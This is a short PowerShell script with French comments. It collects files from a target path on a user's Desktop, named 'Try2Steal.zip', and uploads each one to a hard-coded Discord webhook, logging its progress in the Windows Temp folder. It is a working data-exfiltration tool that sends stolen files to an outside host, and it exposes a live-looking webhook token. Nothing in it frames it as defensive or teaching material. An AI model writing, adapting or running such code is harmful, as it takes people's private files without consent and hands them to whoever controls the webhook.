# Dossier à cibler
$TargetFolder = "C:\Users\Desktop\Try2Steal.zip"

# URL du webhook Discord
$WebhookURL = "https://discord.com/api/webhooks/1324719273389723679/RCoV9w6F3td5QuvQkHpXQ5eC_ocPf-VZZ-6pgTpI7mrMdeZ2PrybMyO8onYP9GVILnm5"

# Fichier de log pour debug
$LogFile = "C:\Windows\Temp\log.txt"

# Fonction pour envoyer un fichier au webhook
function Send-File {
    param ([string]$FilePath)

    # Log
    Add-Content -Path $LogFile -Value "Envoi du fichier: $FilePath"

    $FileName = [System.IO.Path]::GetFileName($FilePath)
    $Boundary = [System.Guid]::NewGuid().ToString()
    $Headers = @{"Content-Type" = "multipart/form-data; boundary=$Boundary"}
    $Body = @"
--$Boundary
Content-Disposition: form-data; name="file"; filename="$FileName"
Content-Type: application/octet-stream

$(Get-Content -Raw -Path $FilePath)
--$Boundary--
"@
    
    # Envoi du fichier au webhook
    try {
        Invoke-RestMethod -Uri $WebhookURL -Method Post -Body $Body -Headers $Headers
        Add-Content -Path $LogFile -Value "Fichier envoyé avec succès"
    } catch {
        Add-Content -Path $LogFile -Value "Erreur lors de l'envoi du fichier: $_"
    }
}

# Log pour démarrer
Add-Content -Path $LogFile -Value "Début du script"

# Envoyer chaque fichier du dossier
Get-ChildItem -Path $TargetFolder -File | ForEach-Object {
    Send-File $_.FullName
}

# Log de fin
Add-Content -Path $LogFile -Value "Fin du script"
